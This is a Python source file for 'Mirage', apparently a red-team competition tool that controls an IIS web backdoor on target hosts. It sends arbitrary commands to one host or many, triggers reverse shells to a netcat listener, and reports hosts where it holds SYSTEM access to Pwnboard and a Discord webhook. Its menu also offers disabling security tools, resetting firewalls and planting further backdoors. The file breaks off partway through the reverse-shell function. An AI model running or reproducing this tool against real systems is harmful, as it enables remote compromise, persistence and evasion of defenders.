import requests
import time
import json
import subprocess
import threading
import socket
import re
import urllib3
from datetime import datetime
from pytz import timezone
from pyfiglet import Figlet
from rich.console import Console
from rich.text import Text
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor, as_completed
from InquirerPy import inquirer
from InquirerPy.base.control import Choice
from InquirerPy.utils import get_style

# Disable HTTPS Warnings for Pwnboard
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Range for x is 1 to 13 inclusive
x_range = range(1, 14)

#ALL_DC = [f"10.{x}.1.1" for x in x_range]
ALL_DC = ["192.168.1.1"]
#ALL_WINRM = [f"10.{x}.1.2" for x in x_range]
ALL_WINRM = []
#ALL_ICMP = [f"10.{x}.1.3" for x in x_range]
ALL_ICMP = []
#ALL_SMB = [f"192.168.{x}.3" for x in x_range]
ALL_SMB = ["192.168.1.6"]
#ALL_IIS = [f"192.168.{x}.4" for x in x_range]
ALL_IIS = []

# Combine all lists into one master host list
ALL_HOSTS = ALL_DC + ALL_WINRM + ALL_ICMP + ALL_SMB + ALL_IIS

PORT = 8080
TIMEOUT = 30
CONCURRENCY = 8
THROTTLE_MS = 50
PWNBOARD_URL = "https://www.pwnboard.win/pwn"
AUTH_TOKEN = "Bearer AUTH_TOKEN_HERE"  # Replace with your actual token
WEBHOOK_URL = "https://discord.com/api/webhooks/FULL_WEBHOOK_HERE"  # Replace with your actual webhook URL

# Callback Global Variables
unprivileged_results = []
privileged_results = []
failed_results = []
error_results = []

console = Console() # For ASCII Art

# Compiled Regex Patterns
COMMAND_RE = re.compile(r'Command:\s*(.+)')
SYSTEM_RE = re.compile(r"nt authority\\system", re.IGNORECASE)

# Set Time Zone
tz = timezone('EST')

matrix_style = get_style({
    "questionmark": "fg:#00FF00 bold",        # bright neon green
    "question": "fg:#00FF00 bold",
    "answer": "fg:#39FF14 bold",              # lime accent
    "pointer": "fg:#00FF00",                  # selection arrow
    "highlighted": "fg:#00FF00 bg:#003300",   # green text on dark green
    "selected": "fg:#ADFF2F",                 # yellow-green
    "separator": "fg:#006400",                # dark green line
    "instruction": "fg:#228B22",              # medium forest green
})

text_style = get_style({
    "questionmark": "fg:#00FF00 bold",       # neon green
    "answer": "fg:#39FF14 bold",             # your typed answer after submit
    "input": "fg:#00FF00",                   # text while typing
})

def ascii_art(text="MIRAGE", color="bright_green"):
    f = Figlet(font="poison")
    art = f.renderText(text).rstrip('\n')
    console.print(Text(art, style=color))

def get_all_local_ips():
    """Get all local IP addresses of the current machine"""
    local_ips = []
    
    try:
        # Get all network interfaces with names
        hostname = socket.gethostname()
        
        # Get all IP addresses associated with the hostname
        all_ips = socket.getaddrinfo(hostname, None)
        for addr_info in all_ips:
            ip = addr_info[4][0]
            if ip not in [ip_info[0] for ip_info in local_ips] and not ip.startswith('127.'):
                local_ips.append((ip, "Hostname Resolution"))
        
        # Also try to get IPs from network interfaces with names (if netifaces available)
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            for interface in interfaces:
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for link in addrs[netifaces.AF_INET]:
                        ip = link['addr']
                        if ip not in [ip_info[0] for ip_info in local_ips] and not ip.startswith('127.'):
                            # Try to get interface description
                            interface_name = interface
                            # Common interface names mapping
                            if interface.startswith('eth'):
                                interface_name = f"Ethernet {interface[3:]}"
                            elif interface.startswith('wlan') or interface.startswith('wlp'):
                                interface_name = f"WiFi {interface[4:]}"
                            elif interface.startswith('en'):
                                interface_name = f"Ethernet {interface[2:]}"
                            elif interface.startswith('tailscale'):
                                interface_name = "Tailscale VPN"
                            elif interface.startswith('tun'):
                                interface_name = f"VPN Tunnel {interface[3:]}"
                            elif interface.startswith('docker'):
                                interface_name = "Docker Network"
                            elif interface == 'lo':
                                interface_name = "Loopback"
                            
                            local_ips.append((ip, interface_name))
        except ImportError:
            pass  # netifaces not available
        
    except:
        pass
    
    # Fallback methods
    try:
        # Try connecting to external service to get outgoing IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            outgoing_ip = s.getsockname()[0]
            if outgoing_ip not in [ip_info[0] for ip_info in local_ips]:
                local_ips.append((outgoing_ip, "Outgoing Connection"))
    except:
        pass
    
    # Add localhost as last resort
    if not local_ips:
        local_ips.append(("127.0.0.1", "Localhost"))
    else:
        # Ensure localhost is included
        if "127.0.0.1" not in [ip_info[0] for ip_info in local_ips]:
            local_ips.append(("127.0.0.1", "Localhost"))
    
    return local_ips

def select_local_ip():
    """Let user select which local IP to use"""
    local_ips = get_all_local_ips()
    
    if not local_ips:
        return "127.0.0.1"
    
    if len(local_ips) == 1:
        return local_ips[0][0]
    
    # Create choices for each IP with interface names
    choices = []
    for ip, interface_name in local_ips:
        # Add description based on IP type
        if ip.startswith('10.') or ip.startswith('192.168.') or (ip.startswith('172.') and 16 <= int(ip.split('.')[1]) <= 31):
            network_type = "Private"
        elif ip.startswith('127.'):
            network_type = "Loopback"
        elif ip.startswith('169.254.'):
            network_type = "Link-local"
        else:
            network_type = "Public"
        
        choices.append(Choice(
            value=ip, 
            name=f"{ip} - {interface_name} ({network_type})"
        ))
    
    # Add exit option
    choices.append(Choice(value=None, name="Exit"))
    
    print("\n=== Network Interface Selection ===")
    selected_ip = inquirer.select(
        message="Select network interface to use:",
        choices=choices,
        style=matrix_style,
        pointer=">>",
        instruction="(Use ↑↓ arrows, Enter to select)",
        default=choices[0].value if choices else None
    ).execute()
    
    if selected_ip is None:
        print("Exiting...")
        exit(0)
    
    return selected_ip

def fwd_pwnboard(target, result):
    # Set up JSON Request
    data = {}
    data["ip"] = target
    data["application"] = "Mirage"
    data["access_type"] = "IIS Backdoor"

    payload = json.dumps(data)
    # print(payload)

    headers = {'Content-Type': 'application/json', 'Authorization': AUTH_TOKEN}

    # Send and check result
    try:
        response = requests.post(PWNBOARD_URL, headers=headers, data=payload, verify=False)
        #print(f"✅ Payload delivered successfully, code {response.status_code}.") testing
        privileged_results.append({
            "target": target,
            "status": "PRIVILEGED - Sent to Pwnboard",
            "pwnboard_status": f"HTTP {response.status_code}"
        })
    except requests.exceptions.HTTPError as err:
        #print(f"❌ HTTP Error: {err}") testing
        privileged_results.append({
            "target": target, 
            "status": "PRIVILEGED - Pwnboard Error",
            "pwnboard_status": f"Error: {err}"
        })
    except requests.exceptions.MissingSchema as nourl:
        #print(f"❌ PWNBoard Error: {nourl}") testing
        privileged_results.append({
            "target": target,
            "status": "PRIVILEGED - Pwnboard Error", 
            "pwnboard_status": f"Error: {nourl}"
        })

def fwd_discord(target, response):
    # Extract the command from the response
    command = COMMAND_RE.search(response).group(1)
    # print(f"Sending : {formatted_msg}")

    # Setup Post Request
    data = {
        "username": "Mirage",
        "embeds": [
            {
                "title": "✅ Command Executed Successfully",
                "color": 0x00FF00,  # green
                "fields": [
                    {"name": "Target", "value": f"`{target}`", "inline": False},
                    {"name": "Command", "value": f"```bash\n{command}\n```", "inline": False}
                ],
                "footer": {"text": "Mirage"},
                "timestamp": str(datetime.now(tz))
            }
        ]
    }

    # Send and check result
    try:
        result = requests.post(WEBHOOK_URL, json = data, timeout = 5)
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    except requests.exceptions.MissingSchema as nourl:
        print("No Discord URL provided : Skipping Webhook")

def send_command(client, port, command, callback=False):
    contact_url = f"http://{client}:{port}/contact.php"
    
    # Send as JSON data
    data = {"input_word": command}

    try:
        # Using form data approach
        r = requests.post(contact_url, json=data, timeout=(3, TIMEOUT))
        clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
        return (client, r.status_code, clean_text)

    except requests.exceptions.ConnectTimeout:
        return (client, "ERR", "Could not connect to the server (timed out)")
    except requests.exceptions.ReadTimeout:
        return (client, "ERR", "Server took to long to respond with command output")
    except Exception as e:
        return (client, "ERR", str(e))
        
def spawn_reverse_shell(client, port, attacker_ip, attacker_port):
    url = f"http://{client}:{port}/search.php"
    command = f"search {attacker_ip} {attacker_port}"
    data = {"input_word": command}
    
    try:
        # Use a very short timeout - we just need to trigger the request
        r = requests.post(url, data=data, timeout=2)
        # If we get here, we got an HTTP response (unexpected for reverse shell)
        return (r.status_code, "Reverse Shell Triggered")
    except requests.exceptions.Timeout:
        # Timeout is EXPECTED - this means the reverse shell is running
        return ("SUCCESS", "Reverse shell connected (timeout expected)")
    except Exception as e:
        return ("ERR", str(e))
        
def start_listener(ip, port):
    def listener():
        try:
            subprocess.run(f"nc -l {ip} {port}", shell=True)
        except Exception as e:
            print(f"Listener error: {e}")
    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    return thread
    
def main_interface():
    action = inquirer.select(
        message="Select an action:",
        choices=[
            Choice(value="SINGULAR", name="Singular Remote Code Execution"),
            Choice(value="MASS", name="Mass Remote Code Execution"),
            Choice(value="SHELL", name="Spawn a Reverse Shell"),
            Choice(value="FIREWALL", name="Reset Firewalls"),
            Choice(value="IFEO", name="Disable Security & Monitoring Tools"),
            Choice(value="UTILITY", name="Spawn Utility Backdoors"),
            Choice(value="SSH", name="Drop SSH Keys (Coming Soon)"),
            Choice(value="SINKHOLE", name="Sinkhole Domains"),
            Choice(value="CALLBACK", name="Test Connections"),
            Choice(value="VIEW_CALLBACKS", name="View All Connections"),
            Choice(value=None, name="Exit"),
        ],
        default="SINGULAR",
        style=matrix_style,
        pointer=">>",
        instruction="(Use ↑↓ arrows, Enter to select)"
    ).execute()
    return action
    
def choose_targets():
    choice = inquirer.select(
        message="Which group would you like to target?",
        choices=[
            Choice(value="ALL_HOSTS", name="All Hosts"),
            Choice(value="ALL_DC", name="All Domain Controllers"),
            Choice(value="ALL_IIS", name="All IIS Hosts"),
            Choice(value="ALL_WINRM", name="All WinRM Hosts"),
            Choice(value="ALL_ICMP", name="All ICMP Hosts"),
            Choice(value="ALL_SMB", name="All SMB Hosts"),
            Choice(value="CUSTOM", name="Custom (Enter Comma-Separated List)"),
            Choice(value=None, name="Cancel"),
        ],
        style=matrix_style,
        pointer=">>",
        instruction="(Use ↑↓ arrows, Enter to select)"
    ).execute()
    
    if not choice:
        return []

    if choice == "CUSTOM":
        while True:
            text = inquirer.text(
                message="Enter Comma-Separated Targets (e.g. 192.168.1.1,192.168.1.2):",
                style=text_style
            ).execute()
            if not text:
                return []
            
            targets = [t.strip() for t in text.split(",") if t.strip()]
            
            # Validate all IPs are in ALL_HOSTS
            invalid_ips = [ip for ip in targets if ip not in ALL_HOSTS]
            
            if invalid_ips:
                print(f"❌ Invalid target IPs: {', '.join(invalid_ips)}")
                retry = inquirer.confirm(
                    message="Would you like to try again?", 
                    default=True,
                    style=text_style
                ).execute()
                if not retry:
                    return []
            else:
                return targets

    mapping = {
        "ALL_HOSTS": ALL_HOSTS,
        "ALL_DC": ALL_DC,
        "ALL_IIS": ALL_IIS,
        "ALL_WINRM": ALL_WINRM,
        "ALL_ICMP": ALL_ICMP,
        "ALL_SMB": ALL_SMB,
    }
    return mapping.get(choice, [])
    
def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None, callback=False):
    console.print(f"\n[bold #00ff00]Executing on {len(clients)} targets...[/bold #00ff00]")
    console.print("=" * 60)
    
    results = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        
        main_task = progress.add_task(f"[#00ff00]Processing {len(clients)} targets...", total=len(clients))
        
        with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
            futures = {}
            for client in clients:
                if action_type == "command" and callback == True:
                    future = ex.submit(send_command, client, port, command, callback)
                elif action_type == "command":
                    future = ex.submit(send_command, client, port, command)
                else:  # shell
                    future = ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port)
                futures[future] = client
                time.sleep(THROTTLE_MS / 1000.0)
            
            for future in as_completed(futures):
                client = futures[future]
                try:
                    result = future.result()
                    if action_type == "command":
                        target, status, response = result
                    else:
                        # spawn_reverse_shell returns different format
                        if len(result) == 3:
                            target, status, response = result
                        else:
                            status, response = result
                            target = client
                    
                    # Determine status color and icon
                    if status == 200 or status == "SUCCESS":
                        status_color = "#00ff00"  # Green
                        status_icon = "✅"
                        status_text = "SUCCESS"
                    elif isinstance(status, int) and 400 <= status < 600:
                        status_color = "#ff0000"  # Red
                        status_icon = "❌"
                        status_text = f"ERROR {status}"
                    else:
                        status_color = "#ffff00"  # Yellow
                        status_icon = "⚠️"
                        status_text = f"FAILED: {status}"
                    
                    results.append({
                        "target": target,
                        "status": status_text,
                        "color": status_color,
                        "icon": status_icon,
                        "response": response
                    })
                    
                except Exception as e:
                    results.append({
                        "target": client,
                        "status": f"EXCEPTION: {str(e)}",
                        "color": "#ff0000",
                        "icon": "💥",
                        "response": ""
                    })
                
                progress.update(main_task, advance=1)
    
    # Send successful callbacks data to fwd_pwnboard
    if callback:
        # Reset global lists
        privileged_results.clear()
        unprivileged_results.clear()
        failed_results.clear()
        error_results.clear()

        # Process new callback results
        successful_results = [r for r in results if r["color"] == "#00ff00"]
        for result in successful_results:
            response_text = str(result["response"])
            if SYSTEM_RE.search(response_text):
                fwd_pwnboard(result["target"], result)
            else:
                unprivileged_results.append(result)
        console.print(f"[bold #00ff00]Forwarded {len(privileged_results)} privileged callbacks to Pwnboard.[/bold #00ff00]")

        failed_results.extend([r for r in results if r["color"] == "#ff0000"])
        error_results.extend([r for r in results if r["color"] == "#ffff00"])
    else:
        # Display results in an appealing way
        display_results(results, action_type)

def display_callbacks():
    console.print("\n")
    
    # Calculate statistics
    total_all = len(privileged_results) + len(unprivileged_results) + len(failed_results) + len(error_results)
    success_rate = len(privileged_results) / total_all * 100 if total_all > 0 else 0.0
    
    header_text = Text()
    header_text.append(f"Total Results: {total_all}", style="bold white")

    # Main header with statistics
    console.print(Panel(
        header_text,
        title="[bold #00ff00]📊 CALLBACK RESULTS SUMMARY[/bold #00ff00]",
        border_style="#00ff00",
        padding=(1, 2),
        expand=False
    ))
    console.print()
    
    # Create detailed sections for each result type
    terminal_width = console.size.width
    
    # PRIVILEGED RESULTS
    if privileged_results:
        priv_header = Text()
        priv_header.append("🟢 ", style="#00ff00")
        priv_header.append(f"PRIVILEGED RESULTS", style="bold #00ff00")
        priv_header.append(f" ({len(privileged_results)})", style="#00ff00")
        
        console.print(Panel(priv_header, border_style="#00ff00", padding=(0, 1)))
        
        priv_table = Table(show_header=True, header_style="bold #00ff00", border_style="#00ff00")
        priv_table.add_column("Target IP", style="white", width=20)
        priv_table.add_column("Status", style="white", min_width=30)
        priv_table.add_column("Details", style="white", min_width=60)
        
        for result in privileged_results:
            target = result.get('target', 'Unknown')
            status = result.get('status', 'No details')
            pwnboard_status = result.get('pwnboard_status', 'Pending')
            details = f"Pwnboard: {pwnboard_status}"
            priv_table.add_row(target, status, details)
        
        console.print(priv_table)
        console.print()
    else:
        console.print(Panel(
            Text("No privileged results", style="dim #00ff00"),
            border_style="#00ff00",
            padding=(1, 2),
            expand=False
        ))
        console.print()
    
    # UNPRIVILEGED RESULTS
    if unprivileged_results:
        unpriv_header = Text()
        unpriv_header.append("🔵 ", style="#3498db")
        unpriv_header.append(f"UNPRIVILEGED RESULTS", style="bold #3498db")
        unpriv_header.append(f" ({len(unprivileged_results)})", style="#3498db")

        console.print(Panel(unpriv_header, border_style="#3498db", padding=(0, 1)))

        unpriv_table = Table(show_header=True, header_style="bold #3498db", border_style="#3498db")
        unpriv_table.add_column("Target IP", style="white", width=20)
        unpriv_table.add_column("Status", style="white", min_width=30)
        unpriv_table.add_column("Details", style="white", min_width=60)

        for result in unprivileged_results:
            target = result.get('target', 'Unknown')
            status = result.get('status', 'User-only')
            details = "User privileges only — system access not present"
            unpriv_table.add_row(target, status, details)

        console.print(unpriv_table)
        console.print()
    else:
        console.print(Panel(
            Text("No unprivileged results", style="dim #5dade2"),
            border_style="#3498db",
            padding=(1, 2),
            expand=False,
        ))
        console.print()
    
    # WARNING/ERROR RESULTS (appear before failures)
    if error_results:
        err_header = Text()
        err_header.append("🟡 ", style="#ffff00")
        err_header.append(f"WARNING/ERROR RESULTS", style="bold #ffff00")
        err_header.append(f" ({len(error_results)})", style="#ffff00")
        
        console.print(Panel(err_header, border_style="#ffff00", padding=(0, 1)))
        
        err_table = Table(show_header=True, header_style="bold #ffff00", border_style="#ffff00")
        err_table.add_column("Target IP", style="white", width=20)
        err_table.add_column("Status", style="white", min_width=30)
        err_table.add_column("Details", style="white", min_width=60)
        
        for result in error_results:
            target = result.get('target', 'Unknown')
            status = result.get('status', 'Warning')
            # Extract meaningful error message
            response = str(result.get('response', ''))
            if 'exception' in status.lower():
                details = "Execution error - Check logs for details"
            elif response:
                details = response[:50] if len(response) > 50 else response
            else:
                details = "Unknown warning condition"
            err_table.add_row(target, status, details)
        
        console.print(err_table)
        console.print()
    else:
        console.print(Panel(
            Text("No warning/error results", style="dim #ffff00"),
            border_style="#ffff00",
            padding=(1, 2),
            expand=False
        ))
        console.print()
    
    # FAILED RESULTS
    if failed_results:
        fail_header = Text()
        fail_header.append("🔴 ", style="#ff0000")
        fail_header.append(f"FAILED RESULTS", style="bold #ff0000")
        fail_header.append(f" ({len(failed_results)})", style="#ff0000")
        
        console.print(Panel(fail_header, border_style="#ff0000", padding=(0, 1)))
        
        fail_table = Table(show_header=True, header_style="bold #ff0000", border_style="#ff0000")
        fail_table.add_column("Target IP", style="white", width=20)
        fail_table.add_column("Status", style="white", min_width=30)
        fail_table.add_column("Details", style="white", min_width=60)
        
        for result in failed_results:
            target = result.get('target', 'Unknown')
            status = result.get('status', 'Failed')
            # Extract meaningful error from response
            response = str(result.get('response', ''))
            if 'timed out' in response.lower():
                details = "Connection timeout - Target unreachable"
            elif 'connection' in response.lower():
                details = "Connection failed - Check target IP/port"
            else:
                details = response[:50] if response else "Unknown failure"
            fail_table.add_row(target, status, details)
        
        console.print(fail_table)
        console.print()
    else:
        console.print(Panel(
            Text("No failed results", style="dim #ff0000"),
            border_style="#ff0000",
            padding=(1, 2),
            expand=False
        ))
        console.print()
    
    # Final Summary Dashboard (compact)
    console.print("=" * min(terminal_width - 2, 100), "\n")

    summary_text = Text()
    summary_text.append(f"🟢 {len(privileged_results)}  ", style="bold #00ff00")
    summary_text.append(f"🔵 {len(unprivileged_results)}  ", style="bold #3498db")
    summary_text.append(f"🟡 {len(error_results)}  ", style="bold #ffff00")
    summary_text.append(f"🔴 {len(failed_results)}\n\n", style="bold #ff0000")
    summary_text.append(f"📋 TOTAL RESULTS: {total_all}\n", style="bold white")
    summary_text.append(f"📈 SUCCESS RATE: {success_rate:.2f}%", style="bold white")

    console.print(Panel(
        summary_text,
        title="[bold #00ff00]📊 FINAL STATISTICS[/bold #00ff00]",
        border_style="#00ff00",
        padding=(1, 2),
        width=50,
        expand=False
    ))

def display_results(results, action_type):
    """Display results in a visually appealing format"""
    
    # Sort results by IP address (lowest to highest)
    def ip_sort_key(ip_str):
        try:
            parts = ip_str.split('.')
            return tuple(int(part) for part in parts)
        except (ValueError, AttributeError):
            return (999, 999, 999, 999)

    sorted_results = sorted(results, key=lambda x: ip_sort_key(x["target"]))
    
    # Summary statistics
    success_count = sum(1 for r in sorted_results if r["color"] == "#00ff00")
    warning_count = sum(1 for r in sorted_results if r["color"] == "#ffff00")
    error_count = sum(1 for r in sorted_results if r["color"] == "#ff0000")
    
    # Create summary panel
    summary_text = Text()
    summary_text.append(f"✅ {success_count} successful", style="#00ff00")
    summary_text.append(" | ")
    summary_text.append(f"⚠️ {warning_count} warnings", style="#ffff00") 
    summary_text.append(" | ")
    summary_text.append(f"❌ {error_count} failed", style="#ff0000")
    
    summary_panel = Panel(
        summary_text,
        title="[bold #00ff00]Execution Summary[/bold #00ff00]",
        border_style="#00ff00"
    )
    console.print(summary_panel)
    
    # Calculate dynamic sizing based on terminal
    terminal_width = console.size.width
    
    # Determine optimal columns per row based on terminal width
    if terminal_width >= 160:
        columns_per_row = 4
    elif terminal_width >= 120:
        columns_per_row = 3
    elif terminal_width >= 80:
        columns_per_row = 2
    else:
        columns_per_row = 1
    
    panel_width = min(55, max(35, (terminal_width - (columns_per_row * 3)) // columns_per_row))
    
    # Create result panels with dynamic sizing
    result_panels = []
    for result in sorted_results:
        content = Text()
        content.append(f"Target: {result['target']}\n", style="bold white")
        content.append(f"Status: ", style="bold")
        content.append(f"{result['status']}\n", style=result['color'])
        
        if action_type == "command" and result["response"] and result["color"] == "#00ff00":
            lines = result["response"].strip().split('\n')
            preview_lines = []
            total_chars = 0
            max_preview_chars = (panel_width - 10) * 3
            
            for line in lines:
                if total_chars + len(line) <= max_preview_chars:
                    preview_lines.append(line)
                    total_chars += len(line)
                else:
                    remaining_chars = max_preview_chars - total_chars
                    if remaining_chars > 10:
                        preview_lines.append(line[:remaining_chars-3] + "...")
                    break
            
            if preview_lines:
                content.append("Response:\n", style="bold")
                for line in preview_lines:
                    if len(line) > panel_width - 5:
                        line = line[:panel_width-8] + "..."
                    content.append(f"{line}\n", style="#CCCCCC")
    
        panel = Panel(
            content,
            title=f"{result['icon']} {result['target']}",
            border_style=result['color'],
            width=panel_width,
            padding=(1, 2),
            expand=False
        )
        result_panels.append(panel)
    
    # Display in dynamic columns
    if result_panels:
        console.print(f"\n[bold #00ff00]Quick Overview ({columns_per_row} per row):[/bold #00ff00]")
        
        for i in range(0, len(result_panels), columns_per_row):
            row_panels = result_panels[i:i + columns_per_row]
            columns = Columns(row_panels, width=panel_width, expand=False, equal=True)
            console.print(columns)
            console.print()
    
    # Always show detailed output option
    if sorted_results:
        show_details = inquirer.confirm(
            message="Show detailed output with complete responses?",
            default=True,
            style=text_style
        ).execute()
        
        if show_details:
            # Organize by status sections
            successful_results = [r for r in sorted_results if r["color"] == "#00ff00"]
            warning_results = [r for r in sorted_results if r["color"] == "#ffff00"]
            error_results = [r for r in sorted_results if r["color"] == "#ff0000"]
            
            # Calculate dynamic line lengths based on terminal width
            line_length = min(100, terminal_width - 4)
            single_line = "─" * line_length
            double_line = "═" * line_length
            
            # Main header
            console.print("\n")
            console.print(Panel(
                f"[bold #00ff00]COMPLETE DETAILED OUTPUT[/bold #00ff00]\n"
                f"[white]Total Targets: {len(sorted_results)} | "
                f"Successful: {success_count} | "
                f"Warnings: {warning_count} | "
                f"Failed: {error_count}[/white]",
                border_style="#00ff00",
                padding=(1, 2)
            ))
            
            # Successful results section
            if successful_results:
                console.print(f"\n{double_line}")
                console.print("[bold #00ff00]✅ SUCCESSFUL EXECUTIONS[/bold #00ff00]")
                console.print(f"{double_line}")
                
                for i, result in enumerate(successful_results):
                    if i > 0:
                        console.print(f"\n{single_line}\n")
                    
                    # Make target IP stand out with background and border
                    console.print(Panel(
                        f"[bold #00ff00]🎯 TARGET: {result['target']}[/bold #00ff00]",
                        border_style="#00ff00",
                        width=line_length,
                        padding=(0, 1)
                    ))
                    
                    console.print(f"[bold white]Status:[/bold white] [#00ff00]{result['status']}[/#00ff00]")
                    
                    if action_type == "command" and result["response"]:
                        console.print(f"\n[bold white]Full Response:[/bold white]")
                        console.print(Panel(
                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
                            border_style="#00ff00",
                            width=line_length,
                            padding=(1, 2)
                        ))
            
            # Warning results section
            if warning_results:
                console.print(f"\n{double_line}")
                console.print("[bold #ffff00]⚠️  WARNINGS & PARTIAL SUCCESS[/bold #ffff00]")
                console.print(f"{double_line}")
                
                for i, result in enumerate(warning_results):
                    if i > 0:
                        console.print(f"\n{single_line}\n")
                    
                    console.print(Panel(
                        f"[bold #ffff00]🎯 TARGET: {result['target']}[/bold #ffff00]",
                        border_style="#ffff00",
                        width=line_length,
                        padding=(0, 1)
                    ))
                    
                    console.print(f"[bold white]Status:[/bold white] [#ffff00]{result['status']}[/#ffff00]")
                    
                    if action_type == "command" and result["response"]:
                        console.print(f"\n[bold white]Response:[/bold white]")
                        console.print(Panel(
                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
                            border_style="#ffff00",
                            width=line_length,
                            padding=(1, 2)
                        ))
            
            # Error results section
            if error_results:
                console.print(f"\n{double_line}")
                console.print("[bold #ff0000]❌ FAILED EXECUTIONS[/bold #ff0000]")
                console.print(f"{double_line}")
                
                for i, result in enumerate(error_results):
                    if i > 0:
                        console.print(f"\n{single_line}\n")
                    
                    console.print(Panel(
                        f"[bold #ff0000]🎯 TARGET: {result['target']}[/bold #ff0000]",
                        border_style="#ff0000",
                        width=line_length,
                        padding=(0, 1)
                    ))
                    
                    console.print(f"[bold white]Status:[/bold white] [#ff0000]{result['status']}[/#ff0000]")
                    
                    if action_type == "command" and result["response"]:
                        console.print(f"\n[bold white]Error Details:[/bold white]")
                        console.print(Panel(
                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
                            border_style="#ff0000",
                            width=line_length,
                            padding=(1, 2)
                        ))
            
            # Final summary (simple listing at bottom)
            console.print(f"\n{double_line}")
            console.print("[bold #00ff00]📊 FINAL SUMMARY[/bold #00ff00]")
            console.print(f"{double_line}")
            console.print(f"[#00ff00]✅ Successful: {success_count} targets[/#00ff00]")
            console.print(f"[#ffff00]⚠️ Warnings:   {warning_count} targets[/#ffff00]")
            console.print(f"[#ff0000]❌ Failed:     {error_count} targets[/#ff0000]")
            console.print(f"[bold white]📋 Total:      {len(sorted_results)} targets[/bold white]")
            console.print(f"{double_line}")

    print()
    log_successful_results = inquirer.confirm(
        message="Log all successful results to Discord?",
        default=True,
        style=text_style
    ).execute()
    
    if log_successful_results:
        for result in sorted_results:
            if result["color"] == "#00ff00":
                fwd_discord(result["target"], result["response"])

def singular_execution():
    while True:
        target = inquirer.text(
            message="Enter target IP:",
            style=text_style
        ).execute()
        
        if not target:
            print("No target specified")
            return

        # Check if target is in ALL_HOSTS
        if target not in ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=False,
                style=text_style,
                transformer=lambda x: "y" if x else "n"
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    command = inquirer.text(
        message="Enter command to execute:",
        style=text_style
    ).execute()
    
    if not command:
        print("No command specified")
        return
    
    console.print(f"\n[bold #00ff00]Sending command to {target}...[/bold #00ff00]")
    console.print("=" * 60)
    
    # Show progress for single execution
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        
        task = progress.add_task(f"[#00ff00]Executing on {target}...", total=1)
        result = send_command(target, PORT, command)
        progress.update(task, advance=1)
    
    target, status, response = result
    
    # Determine status color and icon
    if status == 200:
        status_color = "#00ff00"
        status_icon = "✅"
        status_text = "SUCCESS"
    elif isinstance(status, int) and 400 <= status < 600:
        status_color = "#ff0000"
        status_icon = "❌"
        status_text = f"ERROR {status}"
    else:
        status_color = "#ffff00"
        status_icon = "⚠️"
        status_text = f"FAILED: {status}"
    
    # Calculate dynamic line length based on terminal width
    terminal_width = console.size.width
    line_length = min(100, terminal_width - 4)
    double_line = "═" * line_length
    
    # Display results in a detailed box
    console.print(f"\n{double_line}")
    console.print("[bold #00ff00]SINGLE TARGET EXECUTION RESULTS[/bold #00ff00]")
    console.print(f"{double_line}")
    
    # Target header
    console.print(Panel(
        f"[bold {status_color}]🎯 TARGET: {target}[/bold {status_color}]",
        border_style=status_color,
        width=line_length,
        padding=(0, 1)
    ))
    
    # Status and command
    console.print(f"\n[bold white]Status:[/bold white] [{status_color}]{status_text}[/{status_color}]")
    
    # Response in a panel
    if response:
        console.print(f"\n[bold white]Full Response:[/bold white]")
        console.print(Panel(
            f"[#CCCCCC]{response}[/#CCCCCC]",
            border_style=status_color,
            width=line_length,
            padding=(1, 2)
        ))
    
    # Final separator
    console.print(f"\n{double_line}")
    console.print(f"{double_line}")

    if status_color == "#00ff00":
        print()
        log_successful_results = inquirer.confirm(
            message="Log successful result to Discord?",
            default=True,
            style=text_style
        ).execute()
        if log_successful_results:
            fwd_discord(target, response)

def mass_execution(command=None, callback=False, targets=None):
    if targets == None:
        targets = choose_targets()
    print(targets)
    if not targets:
        print("No targets selected")
        return

    if command == None:
        command = inquirer.text(
            message="Enter command to execute on all targets:",
            style=text_style
        ).execute()

    if not command:
        print("No command entered")
        return
    
    print(f"\nTargeting {len(targets)} hosts with command: {command}")
    confirm = inquirer.confirm(
        message="Proceed?", 
        default=True,
        style=text_style
    ).execute()
    if not confirm:
        return
    
    run_threads(targets, PORT, command, "command", callback=callback)

def shell_execution(selected_ip):
    # For shell spawning, only allow single target selection
    print("\n=== Reverse Shell Setup ===")
    
    # Get single target
    while True:
        target = inquirer.text(
            message="Enter target IP:",
            style=text_style
        ).execute()
        
        if not target:
            print("No target specified")
            return
        
        # Check if target is in ALL_HOSTS
        if target not in ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=True,
                style=text_style
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    # Get listener details
    listener_ip = inquirer.text(
        message="Listener IP:", 
        default=selected_ip,
        style=text_style
    ).execute()
    
    listener_port = inquirer.text(
        message="Listener port:", 
        default="6767",
        style=text_style
    ).execute()
    
    confirm = inquirer.confirm(
        message=f"Trigger reverse shell from {target} to {listener_ip}:{listener_port}?", 
        default=True,
        style=text_style
    ).execute()
    
    if not confirm:
        return
    
    # Start listener
    print(f"Starting listener on {listener_ip}:{listener_port}...")
    listener_thread = start_listener(listener_ip, listener_port)
    time.sleep(1)
    
